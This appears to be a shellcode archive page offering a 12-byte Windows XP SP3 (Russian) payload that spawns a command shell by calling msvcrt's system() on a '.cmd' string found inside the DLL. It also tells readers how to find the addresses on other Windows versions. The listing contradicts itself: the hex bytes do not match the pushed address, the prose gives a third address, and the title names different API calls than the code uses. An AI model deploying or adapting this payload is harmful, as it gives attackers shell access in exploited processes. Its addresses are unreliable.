<html><head><title>Windows - XP sp3 (Ru) WinExec+ExitProcess cmd shellcode - 12 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>

68 9D 61 F9 77  push 0x77C01345
B8 C7 93 C1 77  mov eax,msvcrt.system
FF D0           call eax
  
In msvcrt.dll at 0x77C01344 We have string &quot;.cmd&quot;, that's the trick.
Code will work in WinXP SP3 Pro Rus, in other versions you'd better search
the string and system(char*) address for yourself.
  
Coded via lord Kelvin.

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
